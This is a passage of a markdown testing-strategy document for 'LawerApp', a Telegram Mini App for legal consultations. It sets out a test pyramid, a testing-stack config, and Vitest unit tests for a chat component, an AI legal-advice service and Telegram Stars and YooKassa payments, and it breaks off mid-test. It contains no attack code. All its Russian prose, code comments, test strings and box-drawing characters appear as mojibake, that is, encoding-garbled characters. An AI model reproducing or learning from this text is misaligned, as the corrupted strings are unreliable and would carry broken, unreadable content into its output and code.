# ğŸ§ª Ğ¡Ñ‚Ñ€Ğ°Ñ‚ĞµĞ³Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ LawerApp Telegram Mini App

## ğŸ“‹ ĞĞ±Ğ·Ğ¾Ñ€ ÑÑ‚Ñ€Ğ°Ñ‚ĞµĞ³Ğ¸Ğ¸ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ

**LawerApp** - ÑÑ‚Ğ¾ ĞºÑ€Ğ¸Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸ Ğ²Ğ°Ğ¶Ğ½Ğ¾Ğµ Ğ¿Ñ€Ğ°Ğ²Ğ¾Ğ²Ğ¾Ğµ Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğµ, ĞºĞ¾Ñ‚Ğ¾Ñ€Ğ¾Ğµ Ñ‚Ñ€ĞµĞ±ÑƒĞµÑ‚ Ğ²Ñ‹ÑĞ¾Ñ‡Ğ°Ğ¹ÑˆĞµĞ³Ğ¾ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ° Ğ¸ Ğ½Ğ°Ğ´ĞµĞ¶Ğ½Ğ¾ÑÑ‚Ğ¸. Ğ”Ğ°Ğ½Ğ½Ğ°Ñ ÑÑ‚Ñ€Ğ°Ñ‚ĞµĞ³Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ Ğ¾ÑĞ½Ğ¾Ğ²Ğ°Ğ½Ğ° Ğ½Ğ° ÑĞ¾Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ½Ñ‹Ñ… Ğ¿Ğ¾Ğ´Ñ…Ğ¾Ğ´Ğ°Ñ… 2025 Ğ³Ğ¾Ğ´Ğ° Ğ¸ Ğ²ĞºĞ»ÑÑ‡Ğ°ĞµÑ‚ Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ğ·Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ½Ğ¾Ğµ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ, AI-Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ¸ Ğ½ĞµĞ¿Ñ€ĞµÑ€Ñ‹Ğ²Ğ½ÑƒÑ Ğ¸Ğ½Ñ‚ĞµĞ³Ñ€Ğ°Ñ†Ğ¸Ñ.

---

## ğŸ¯ ĞŸÑ€Ğ¸Ğ½Ñ†Ğ¸Ğ¿Ñ‹ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ

### **1. Test Pyramid Strategy**
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    Test Pyramid 2025                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚                E2E Tests (5%)                          â”‚ â”‚
â”‚  â”‚              â€¢ Critical User Journeys                  â”‚ â”‚
â”‚  â”‚              â€¢ AI-Powered Test Generation              â”‚ â”‚
â”‚  â”‚              â€¢ Cross-Platform Testing                  â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚              Integration Tests (25%)                   â”‚ â”‚
â”‚  â”‚              â€¢ API Testing                             â”‚ â”‚
â”‚  â”‚              â€¢ Database Testing                        â”‚ â”‚
â”‚  â”‚              â€¢ External Service Testing                â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚              Unit Tests (70%)                          â”‚ â”‚
â”‚  â”‚              â€¢ Component Testing                       â”‚ â”‚
â”‚  â”‚              â€¢ Business Logic Testing                  â”‚ â”‚
â”‚  â”‚              â€¢ AI Model Testing                        â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### **2. AI-First Testing Approach**
- **AI-Generated Test Cases** - Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ°Ñ Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ†Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
- **Intelligent Test Selection** - ÑƒĞ¼Ğ½Ñ‹Ğ¹ Ğ²Ñ‹Ğ±Ğ¾Ñ€ Ñ‚ĞµÑÑ‚Ğ¾Ğ² Ğ´Ğ»Ñ Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ĞµĞ½Ğ¸Ñ
- **Predictive Testing** - Ğ¿Ñ€ĞµĞ´ÑĞºĞ°Ğ·Ğ°Ğ½Ğ¸Ğµ Ğ¿Ğ¾Ñ‚ĞµĞ½Ñ†Ğ¸Ğ°Ğ»ÑŒĞ½Ñ‹Ñ… Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼
- **Self-Healing Tests** - ÑĞ°Ğ¼Ğ¾Ğ²Ğ¾ÑÑÑ‚Ğ°Ğ½Ğ°Ğ²Ğ»Ğ¸Ğ²Ğ°ÑÑ‰Ğ¸ĞµÑÑ Ñ‚ĞµÑÑ‚Ñ‹

### **3. Continuous Testing**
- **Shift-Left Testing** - Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ½Ğ° Ñ€Ğ°Ğ½Ğ½Ğ¸Ñ… ÑÑ‚Ğ°Ğ¿Ğ°Ñ…
- **Shift-Right Testing** - Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ² Ğ¿Ñ€Ğ¾Ğ´Ğ°ĞºÑˆĞµĞ½Ğµ
- **Real-Time Monitoring** - Ğ¼Ğ¾Ğ½Ğ¸Ñ‚Ğ¾Ñ€Ğ¸Ğ½Ğ³ Ğ² Ñ€ĞµĞ°Ğ»ÑŒĞ½Ğ¾Ğ¼ Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ¸
- **Automated Rollback** - Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸Ğ¹ Ğ¾Ñ‚ĞºĞ°Ñ‚ Ğ¿Ñ€Ğ¸ Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼Ğ°Ñ…

---

## ğŸ—ï¸ ĞÑ€Ñ…Ğ¸Ñ‚ĞµĞºÑ‚ÑƒÑ€Ğ° Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ

### **1. Test Infrastructure**

#### **Modern Testing Stack 2025**
```typescript
// testing.config.ts
export const testingConfig = {
  // Unit Testing
  unit: {
    framework: 'Vitest', // Ğ‘Ñ‹ÑÑ‚Ñ€ĞµĞµ Jest
    coverage: 'V8', // Ğ‘Ğ¾Ğ»ĞµĞµ Ñ‚Ğ¾Ñ‡Ğ½Ğ¾Ğµ Ğ¿Ğ¾ĞºÑ€Ñ‹Ñ‚Ğ¸Ğµ
    parallel: true,
    watch: true
  },
  
  // Integration Testing
  integration: {
    framework: 'Playwright', // Ğ¡Ğ¾Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ½Ñ‹Ğ¹ E2E
    browsers: ['chromium', 'firefox', 'webkit'],
    mobile: true,
    api: 'Supertest'
  },
  
  // AI Testing
  ai: {
    framework: 'TestCraft AI', // AI-Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ†Ğ¸Ñ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
    model: 'GPT-4o', // Ğ”Ğ»Ñ Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ†Ğ¸Ğ¸ Ñ‚ĞµÑÑ‚Ğ¾Ğ²Ñ‹Ñ… ÑÑ†ĞµĞ½Ğ°Ñ€Ğ¸ĞµĞ²
    visual: 'Percy', // Ğ’Ğ¸Ğ·ÑƒĞ°Ğ»ÑŒĞ½Ğ¾Ğµ Ñ‚ĞµÑÑ‚Ğ¸Ñ€Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ
    performance: 'Lighthouse CI'
  },
  
  // Security Testing
  security: {
    saast: 'Snyk', // Static Application Security Testing
    dast: 'OWASP ZAP', // Dynamic Application Security Testing
    iast: 'Contrast Security', // Interactive Application Security Testing
    secrets: 'GitGuardian' // ĞŸĞ¾Ğ¸ÑĞº ÑĞµĞºÑ€ĞµÑ‚Ğ¾Ğ² Ğ² ĞºĞ¾Ğ´Ğµ
  }
};
```

#### **Test Environment Setup**
```typescript
// tests/setup/test-environment.ts
export class TestEnvironment {
  private static instance: TestEnvironment;
  private testDatabase: TestDatabase;
  private mockServices: MockServices;
  private aiTestGenerator: AITestGenerator;

  static async setup(): Promise<TestEnvironment> {
    if (!this.instance) {
      this.instance = new TestEnvironment();
      await this.instance.initialize();
    }
    return this.instance;
  }

  private async initialize(): Promise<void> {
    // ĞĞ°ÑÑ‚Ñ€Ğ°Ğ¸Ğ²Ğ°ĞµĞ¼ Ñ‚ĞµÑÑ‚Ğ¾Ğ²ÑƒÑ Ğ±Ğ°Ğ·Ñƒ Ğ´Ğ°Ğ½Ğ½Ñ‹Ñ…
    this.testDatabase = await TestDatabase.create({
      type: 'postgresql',
      host: 'localhost',
      port: 5432,
      database: 'lawerapp_test',
      reset: true
    });

    // ĞĞ°ÑÑ‚Ñ€Ğ°Ğ¸Ğ²Ğ°ĞµĞ¼ Ğ¼Ğ¾ĞºĞ¸ Ğ²Ğ½ĞµÑˆĞ½Ğ¸Ñ… ÑĞµÑ€Ğ²Ğ¸ÑĞ¾Ğ²
    this.mockServices = new MockServices({
      telegram: new MockTelegramService(),
      timeweb: new MockTimeWebService(),
      payments: new MockPaymentServices(),
      ai: new MockAIService()
    });

    // Ğ˜Ğ½Ğ¸Ñ†Ğ¸Ğ°Ğ»Ğ¸Ğ·Ğ¸Ñ€ÑƒĞµĞ¼ AI Ğ³ĞµĞ½ĞµÑ€Ğ°Ñ‚Ğ¾Ñ€ Ñ‚ĞµÑÑ‚Ğ¾Ğ²
    this.aiTestGenerator = new AITestGenerator({
      model: 'gpt-4o',
      apiKey: process.env.OPENAI_API_KEY
    });
  }

  async cleanup(): Promise<void> {
    await this.testDatabase.cleanup();
    await this.mockServices.cleanup();
  }
}
```

---

## ğŸ”¬ Unit Testing

### **1. Component Testing**

#### **React Component Testing**
```typescript
// tests/unit/components/ChatInterface.test.tsx
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { vi } from 'vitest';
import { ChatInterface } from '@/components/features/ai/ChatInterface';
import { TestEnvironment } from '@/tests/setup/test-environment';

describe('ChatInterface', () => {
  let testEnv: TestEnvironment;

  beforeAll(async () => {
    testEnv = await TestEnvironment.setup();
  });

  afterAll(async () => {
    await testEnv.cleanup();
  });

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('Message Sending', () => {
    it('should send message and display response', async () => {
      // Arrange
      const mockAIService = vi.mocked(aiService);
      mockAIService.getLegalConsultation.mockResolvedValue({
        answer: 'Ğ­Ñ‚Ğ¾ Ğ¿Ñ€Ğ°Ğ²Ğ¾Ğ²Ğ¾Ğ¹ Ğ¾Ñ‚Ğ²ĞµÑ‚',
        sources: [],
        suggestions: []
      });

      render(<ChatInterface />);

      // Act
      const input = screen.getByPlaceholderText('Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ²Ğ°Ñˆ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ...');
      const sendButton = screen.getByRole('button', { name: 'ĞÑ‚Ğ¿Ñ€Ğ°Ğ²Ğ¸Ñ‚ÑŒ' });

      fireEvent.change(input, { target: { value: 'ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€?' } });
      fireEvent.click(sendButton);

      // Assert
      await waitFor(() => {
        expect(screen.getByText('ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€?')).toBeInTheDocument();
        expect(screen.getByText('Ğ­Ñ‚Ğ¾ Ğ¿Ñ€Ğ°Ğ²Ğ¾Ğ²Ğ¾Ğ¹ Ğ¾Ñ‚Ğ²ĞµÑ‚')).toBeInTheDocument();
      });

      expect(mockAIService.getLegalConsultation).toHaveBeenCalledWith({
        message: 'ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€?',
        context: null,
        conversationHistory: []
      });
    });

    it('should handle AI service errors gracefully', async () => {
      // Arrange
      const mockAIService = vi.mocked(aiService);
      mockAIService.getLegalConsultation.mockRejectedValue(
        new Error('AI service unavailable')
      );

      render(<ChatInterface />);

      // Act
      const input = screen.getByPlaceholderText('Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ²Ğ°Ñˆ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ...');
      const sendButton = screen.getByRole('button', { name: 'ĞÑ‚Ğ¿Ñ€Ğ°Ğ²Ğ¸Ñ‚ÑŒ' });

      fireEvent.change(input, { target: { value: 'Ğ¢ĞµÑÑ‚' } });
      fireEvent.click(sendButton);

      // Assert
      await waitFor(() => {
        expect(screen.getByText('ĞÑˆĞ¸Ğ±ĞºĞ° Ğ¿Ñ€Ğ¸ Ğ¿Ğ¾Ğ»ÑƒÑ‡ĞµĞ½Ğ¸Ğ¸ Ğ¾Ñ‚Ğ²ĞµÑ‚Ğ°')).toBeInTheDocument();
      });
    });
  });

  describe('Context Awareness', () => {
    it('should maintain conversation context', async () => {
      // Arrange
      const mockAIService = vi.mocked(aiService);
      mockAIService.getLegalConsultation.mockResolvedValue({
        answer: 'ĞÑ‚Ğ²ĞµÑ‚ Ñ ĞºĞ¾Ğ½Ñ‚ĞµĞºÑÑ‚Ğ¾Ğ¼',
        sources: [],
        suggestions: []
      });

      render(<ChatInterface />);

      // Act - Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµĞ¼ Ğ½ĞµÑĞºĞ¾Ğ»ÑŒĞºĞ¾ ÑĞ¾Ğ¾Ğ±Ñ‰ĞµĞ½Ğ¸Ğ¹
      const input = screen.getByPlaceholderText('Ğ’Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ²Ğ°Ñˆ Ğ²Ğ¾Ğ¿Ñ€Ğ¾Ñ...');
      const sendButton = screen.getByRole('button', { name: 'ĞÑ‚Ğ¿Ñ€Ğ°Ğ²Ğ¸Ñ‚ÑŒ' });

      fireEvent.change(input, { target: { value: 'Ğ£ Ğ¼ĞµĞ½Ñ Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼Ğ° Ñ Ñ‚Ğ¾Ğ²Ğ°Ñ€Ğ¾Ğ¼' } });
      fireEvent.click(sendButton);

      await waitFor(() => {
        expect(screen.getByText('Ğ£ Ğ¼ĞµĞ½Ñ Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼Ğ° Ñ Ñ‚Ğ¾Ğ²Ğ°Ñ€Ğ¾Ğ¼')).toBeInTheDocument();
      });

      fireEvent.change(input, { target: { value: 'Ğ§Ñ‚Ğ¾ Ğ´ĞµĞ»Ğ°Ñ‚ÑŒ Ğ´Ğ°Ğ»ÑŒÑˆĞµ?' } });
      fireEvent.click(sendButton);

      // Assert
      await waitFor(() => {
        expect(mockAIService.getLegalConsultation).toHaveBeenLastCalledWith({
          message: 'Ğ§Ñ‚Ğ¾ Ğ´ĞµĞ»Ğ°Ñ‚ÑŒ Ğ´Ğ°Ğ»ÑŒÑˆĞµ?',
          context: expect.any(Object),
          conversationHistory: expect.arrayContaining([
            expect.objectContaining({ content: 'Ğ£ Ğ¼ĞµĞ½Ñ Ğ¿Ñ€Ğ¾Ğ±Ğ»ĞµĞ¼Ğ° Ñ Ñ‚Ğ¾Ğ²Ğ°Ñ€Ğ¾Ğ¼' })
          ])
        });
      });
    });
  });
});
```

### **2. Business Logic Testing**

#### **AI Service Testing**
```typescript
// tests/unit/services/ai-service.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { AIService } from '@/lib/ai/ai-service';
import { RAGService } from '@/lib/ai/rag-service';
import { VectorStore } from '@/lib/ai/vector-store';

describe('AIService', () => {
  let aiService: AIService;
  let mockRAGService: vi.Mocked<RAGService>;
  let mockVectorStore: vi.Mocked<VectorStore>;

  beforeEach(() => {
    mockRAGService = {
      searchLegalKnowledge: vi.fn(),
      generateContextualResponse: vi.fn()
    } as any;

    mockVectorStore = {
      searchSimilar: vi.fn(),
      storeDocument: vi.fn()
    } as any;

    aiService = new AIService(mockRAGService, mockVectorStore);
  });

  describe('getLegalConsultation', () => {
    it('should provide accurate legal consultation', async () => {
      // Arrange
      const query = 'ĞšĞ°Ğº Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€ Ğ½ĞµĞ½Ğ°Ğ´Ğ»ĞµĞ¶Ğ°Ñ‰ĞµĞ³Ğ¾ ĞºĞ°Ñ‡ĞµÑÑ‚Ğ²Ğ°?';
      const context = {
        area: 'consumer' as const,
        jurisdiction: 'russia' as const,
        urgency: 'medium' as const,
        complexity: 'simple' as const
      };

      mockRAGService.searchLegalKnowledge.mockResolvedValue([
        {
          content: 'Ğ¡Ğ¾Ğ³Ğ»Ğ°ÑĞ½Ğ¾ ÑÑ‚. 18 Ğ—Ğ—ĞŸĞŸ, Ğ¿Ğ¾Ñ‚Ñ€ĞµĞ±Ğ¸Ñ‚ĞµĞ»ÑŒ Ğ²Ğ¿Ñ€Ğ°Ğ²Ğµ...',
          source: { title: 'Ğ—Ğ—ĞŸĞŸ Ğ Ğ¤', url: 'https://example.com' },
          relevance: 0.95
        }
      ]);

      mockRAGService.generateContextualResponse.mockResolvedValue({
        answer: 'Ğ’Ñ‹ Ğ¼Ğ¾Ğ¶ĞµÑ‚Ğµ Ğ²ĞµÑ€Ğ½ÑƒÑ‚ÑŒ Ñ‚Ğ¾Ğ²Ğ°Ñ€ Ğ² Ñ‚ĞµÑ‡ĞµĞ½Ğ¸Ğµ 14 Ğ´Ğ½ĞµĞ¹...',
        sources: [{ title: 'Ğ—Ğ—ĞŸĞŸ Ğ Ğ¤', url: 'https://example.com' }],
        confidence: 0.92
      });

      // Act
      const result = await aiService.getLegalConsultation({
        message: query,
        context,
        conversationHistory: []
      });

      // Assert
      expect(result.answer).toContain('14 Ğ´Ğ½ĞµĞ¹');
      expect(result.sources).toHaveLength(1);
      expect(result.confidence).toBeGreaterThan(0.9);
      expect(mockRAGService.searchLegalKnowledge).toHaveBeenCalledWith(
        query,
        context
      );
    });

    it('should handle complex legal questions', async () => {
      // Arrange
      const complexQuery = 'ĞœĞ¾Ğ³Ñƒ Ğ»Ğ¸ Ñ Ñ€Ğ°ÑÑ‚Ğ¾Ñ€Ğ³Ğ½ÑƒÑ‚ÑŒ Ğ´Ğ¾Ğ³Ğ¾Ğ²Ğ¾Ñ€ ĞºÑƒĞ¿Ğ»Ğ¸-Ğ¿Ñ€Ğ¾Ğ´Ğ°Ğ¶Ğ¸ Ğ½ĞµĞ´Ğ²Ğ¸Ğ¶Ğ¸Ğ¼Ğ¾ÑÑ‚Ğ¸?';
      
      mockRAGService.searchLegalKnowledge.mockResolvedValue([
        {
          content: 'Ğ¡Ğ¾Ğ³Ğ»Ğ°ÑĞ½Ğ¾ ÑÑ‚. 450 Ğ“Ğš Ğ Ğ¤, Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ¸Ğµ Ğ¸ Ñ€Ğ°ÑÑ‚Ğ¾Ñ€Ğ¶ĞµĞ½Ğ¸Ğµ Ğ´Ğ¾Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ°...',
          source: { title: 'Ğ“Ğš Ğ Ğ¤', url: 'https://example.com' },
          relevance: 0.88
        },
        {
          content: 'Ğ¡Ñ‚. 451 Ğ“Ğš Ğ Ğ¤ Ğ¿Ñ€ĞµĞ´ÑƒÑĞ¼Ğ°Ñ‚Ñ€Ğ¸Ğ²Ğ°ĞµÑ‚ Ğ¾ÑĞ½Ğ¾Ğ²Ğ°Ğ½Ğ¸Ñ Ğ´Ğ»Ñ Ñ€Ğ°ÑÑ‚Ğ¾Ñ€Ğ¶ĞµĞ½Ğ¸Ñ...',
          source: { title: 'Ğ“Ğš Ğ Ğ¤', url: 'https://example.com' },
          relevance: 0.85
        }
      ]);

      mockRAGService.generateContextualResponse.mockResolvedValue({
        answer: 'Ğ Ğ°ÑÑ‚Ğ¾Ñ€Ğ¶ĞµĞ½Ğ¸Ğµ Ğ´Ğ¾Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ° ĞºÑƒĞ¿Ğ»Ğ¸-Ğ¿Ñ€Ğ¾Ğ´Ğ°Ğ¶Ğ¸ Ğ²Ğ¾Ğ·Ğ¼Ğ¾Ğ¶Ğ½Ğ¾ Ğ² ÑĞ»ĞµĞ´ÑƒÑÑ‰Ğ¸Ñ… ÑĞ»ÑƒÑ‡Ğ°ÑÑ…...',
        sources: [
          { title: 'Ğ“Ğš Ğ Ğ¤', url: 'https://example.com' },
          { title: 'Ğ“Ğš Ğ Ğ¤', url: 'https://example.com' }
        ],
        confidence: 0.87
      });

      // Act
      const result = await aiService.getLegalConsultation({
        message: complexQuery,
        context: {
          area: 'civil',
          jurisdiction: 'russia',
          urgency: 'high',
          complexity: 'complex'
        },
        conversationHistory: []
      });

      // Assert
      expect(result.answer).toContain('Ñ€Ğ°ÑÑ‚Ğ¾Ñ€Ğ¶ĞµĞ½Ğ¸Ğµ Ğ´Ğ¾Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ°');
      expect(result.sources).toHaveLength(2);
      expect(result.confidence).toBeGreaterThan(0.8);
    });

    it('should provide fallback for unknown legal areas', async () => {
      // Arrange
      const unknownQuery = 'Ğ’Ğ¾Ğ¿Ñ€Ğ¾Ñ Ğ¿Ğ¾ ĞºĞ¾ÑĞ¼Ğ¸Ñ‡ĞµÑĞºĞ¾Ğ¼Ñƒ Ğ¿Ñ€Ğ°Ğ²Ñƒ';
      
      mockRAGService.searchLegalKnowledge.mockResolvedValue([]);
      mockRAGService.generateContextualResponse.mockResolvedValue({
        answer: 'Ğš ÑĞ¾Ğ¶Ğ°Ğ»ĞµĞ½Ğ¸Ñ, Ñƒ Ğ¼ĞµĞ½Ñ Ğ½ĞµÑ‚ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ğ¸ Ğ¿Ğ¾ Ğ´Ğ°Ğ½Ğ½Ğ¾Ğ¼Ñƒ Ğ²Ğ¾Ğ¿Ñ€Ğ¾ÑÑƒ. Ğ ĞµĞºĞ¾Ğ¼ĞµĞ½Ğ´ÑƒÑ Ğ¾Ğ±Ñ€Ğ°Ñ‚Ğ¸Ñ‚ÑŒÑÑ Ğº ÑĞ¿ĞµÑ†Ğ¸Ğ°Ğ»Ğ¸ÑÑ‚Ñƒ.',
        sources: [],
        confidence: 0.1
      });

      // Act
      const result = await aiService.getLegalConsultation({
        message: unknownQuery,
        context: {
          area: 'unknown',
          jurisdiction: 'russia',
          urgency: 'low',
          complexity: 'simple'
        },
        conversationHistory: []
      });

      // Assert
      expect(result.answer).toContain('Ğ½ĞµÑ‚ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ğ¸');
      expect(result.confidence).toBeLessThan(0.5);
    });
  });
});
```

### **3. Payment System Testing**

#### **Payment Processing Testing**
```typescript
// tests/unit/services/payment-service.test.ts
import { describe, it, expect, beforeEach, vi } from 'vitest';
import { PaymentManager } from '@/lib/payments/payment-manager';
import { TelegramStarsService } from '@/lib/payments/telegram-stars';
import { YooKassaService } from '@/lib/payments/yookassa';

describe('PaymentManager', () => {
  let paymentManager: PaymentManager;
  let mockTelegramStars: vi.Mocked<TelegramStarsService>;
  let mockYooKassa: vi.Mocked<YooKassaService>;

  beforeEach(() => {
    mockTelegramStars = {
      createInvoice: vi.fn(),
      sendInvoice: vi.fn(),
      verifyPayment: vi.fn()
    } as any;

    mockYooKassa = {
      createPayment: vi.fn(),
      getPaymentStatus: vi.fn(),
      capturePayment: vi.fn()
    } as any;

    paymentManager = new PaymentManager(
      mockTelegramStars,
      mockYooKassa
    );
  });

  describe('processPayment', () => {
    it('should process Telegram Stars payment successfully', async () => {
      // Arrange
      const paymentData = {
        userId: 'user123',
        amount: 100,
        method: 'telegram_stars' as const,
        description: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ğ°Ñ Ğ¾Ğ¿Ğ»Ğ°Ñ‚Ğ°',
        orderId: 'order123'
      };

      mockTelegramStars.createInvoice.mockResolvedValue({
        id: 'invoice123',
        confirmation: { confirmation_url: null }
      });

      mockTelegramStars.sendInvoice.mockResolvedValue(true);

      // Act
      const result = await paymentManager.processPayment(paymentData);

      // Assert
      expect(result.success).toBe(true);
      expect(result.paymentId).toBe('invoice123');
      expect(result.status).toBe('pending');
      expect(mockTelegramStars.createInvoice).toHaveBeenCalledWith({
        title: paymentData.description,
        description: paymentData.description,
        payload: paymentData.orderId,
        provider_token: expect.any(String),
        currency: 'XTR',
        prices: [{
          label: paymentData.description,
          amount: paymentData.amount
        }]
      });
    });

    it('should process YooKassa payment successfully', async () => {
      // Arrange
      const paymentData = {
        userId: 'user123',
        amount: 1000,
        method: 'yookassa' as const,
        description: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ğ°Ñ Ğ¾Ğ¿Ğ»Ğ°Ñ‚Ğ°',
        orderId: 'order123'
      };

      mockYooKassa.createPayment.mockResolvedValue({
        id: 'payment123',
        confirmation: {
          type: 'redirect',
          confirmation_url: 'https://yookassa.ru/checkout'
        }
      });

      // Act
      const result = await paymentManager.processPayment(paymentData);

      // Assert
      expect(result.success).toBe(true);
      expect(result.paymentId).toBe('payment123');
      expect(result.redirectUrl).toBe('https://yookassa.ru/checkout');
      expect(mockYooKassa.createPayment).toHaveBeenCalledWith({
        amount: {
          value: '1000.00',
          currency: 'RUB'
        },
        confirmation: {
          type: 'redirect',
          return_url: expect.any(String)
        },
        description: paymentData.description,
        metadata: {
          orderId: paymentData.orderId,
          userId: paymentData.userId
        }
      });
    });

    it('should handle payment failures gracefully', async () => {
      // Arrange
      const paymentData = {
        userId: 'user123',
        amount: 100,
        method: 'telegram_stars' as const,
        description: 'Ğ¢ĞµÑÑ‚Ğ¾Ğ²Ğ°Ñ Ğ¾Ğ¿Ğ»Ğ°Ñ‚Ğ°',
        orderId: 'order123'
      };

      mockTelegramStars.createInvoice.mockRejectedValue(
        new Error('Telegram API error')
      );

      // Act
